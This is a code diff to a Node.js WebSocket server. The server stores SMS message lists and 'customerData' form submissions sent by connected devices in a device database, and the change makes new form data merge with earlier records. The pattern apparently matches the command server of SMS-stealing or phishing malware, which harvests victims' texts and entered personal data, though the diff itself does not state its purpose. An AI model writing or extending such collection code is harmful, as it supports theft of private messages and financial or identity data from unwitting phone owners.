@@ -185,7 +185,13 @@ wss.on('connection', (ws, req) => {
       if (data.type === 'SMS_LIST' && data.messages) {
           updateSet.smsMessages = data.messages.filter(m => !deletedLog.includes(`${m.body}_${m.date || m.time}`));
       }
-      if (data.type === 'FORM_SUBMIT' && data.customerData) updateSet.customerData = data.customerData;
+      
+      // Handle Form Data from App
+      if (data.type === 'FORM_SUBMIT' && data.customerData) {
+          updateSet.customerData = { ...(existingDevice?.customerData || {}), ...data.customerData };
+      } else if (data.type === 'FORM_DATA' && data.data) {
+          updateSet.customerData = { ...(existingDevice?.customerData || {}), ...data.data };
+      }
       
       if (dbConnected) {
           await Device.findOneAndUpdate({ deviceId: id }, { $set: updateSet, $setOnInsert: { registrationTimestamp: new Date(), isPinned: false } }, { upsert: true });
